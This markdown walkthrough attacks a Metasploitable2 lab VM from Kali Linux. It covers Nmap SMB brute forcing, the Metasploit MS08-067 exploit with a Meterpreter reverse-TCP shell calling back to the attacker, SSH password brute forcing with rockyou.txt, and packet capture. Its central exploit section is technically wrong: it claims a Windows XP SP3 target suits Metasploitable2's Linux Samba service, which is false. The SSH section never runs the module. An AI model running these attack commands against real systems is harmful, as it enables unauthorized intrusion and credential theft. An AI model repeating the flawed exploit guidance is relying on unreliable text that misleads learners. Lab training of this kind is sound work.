# Metasploitable2 Pentesting Workflow

This document provides a clean, structured, and professional walkthrough of working with Metasploitable2 and Kali Linux for SMB enumeration, exploitation, brute forcing, and packet capture.

---

## Environment Setup

- **Metasploitable2 IP:** `192.168.2.188`
- **Kali Linux IP:** `192.168.2.100` (Static)

To access SMB share:
```
smbclient //192.168.2.188/tmp -U msfadmin%msfadmin
```

You can SSH into Metasploitable2 for easier command execution.

---

## Downloading and Setting Up Kali Linux and Metasploitable2

### Installing VMware Workstation / VMware Player
1. Download VMware Workstation Pro or VMware Player from the official VMware website.
2. Install using default settings.
3. Ensure virtualization is enabled in BIOS.

### Downloading Kali Linux
1. Visit the official Kali Linux download page.
2. Download the Kali Linux VMware image.
3. Extract the archive.
4. Open VMware → File → Open → Select the `.vmx` file.
5. Start the VM and allow VMware Tools to install if prompted.
6. Set static IP (optional but recommended):
```
nm-connection-editor
```

### Downloading Metasploitable2
1. Download Metasploitable2 from the Rapid7 website.
2. Extract the VM archive.
3. In VMware → File → Open → select the Metasploitable2 `.vmx`.
4. Boot using default credentials:
```
username: msfadmin
password: msfadmin
```

Ensure both VMs are connected to the same VMware network (Host-Only or NAT).

---

## Network Troubleshooting

If DHCP leasing does not refresh the IP address automatically:
```
sudo systemctl restart networking
ip addr
```

---

## SMB Brute-Force Enumeration via Nmap

Run Nmap SMB brute-force script:
```
sudo nmap --script smb-brute.nse -p 445 192.168.2.188
```

---

## Exploiting MS08-067 (Windows SMB Vulnerability)

Launch Metasploit:
```
sudo msfconsole
```

Load exploit:
```
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.2.188
```

Optional: List payloads
```
show payloads
```

Set payload:
```
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.2.100
```

Exploit:
```
exploit
```

### If exploit fails, use a specific target profile
```
use exploit/windows/smb/ms08_067_netapi
set TARGET 17
```
Target 17 corresponds to **Windows XP SP3 (x86)**, which is compatible with Metasploitable2's Samba service behavior.

---

## Unix Samba Exploit Path

Metasploitable2 primarily uses **Samba on Linux**, so Unix-focused SMB exploits may be more accurate depending on the scenario.

---

## SSH Brute Forcing with Metasploit

Start Metasploit:
```
sudo msfconsole
```

Load SSH brute-force module:
```
use auxiliary/scanner/ssh/ssh_login
```

Set options:
```
set RHOSTS 192.168.2.188
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 20
set VERBOSE true
```

Check current configuration:
```
show options
```

View running jobs:
```
jobs
```

---

## Packet Capture on Kali Linux

Capture SSH brute force traffic:
```
sudo tcpdump -i eth0 host 192.168.2.188 and port 22 -w ssh_bruteforce.pcap
```

---

## Notes
- Ensure both machines are on the same subnet.
- Disable firewall if testing isolated labs.
- Use only on authorized systems.

---

End of Document.

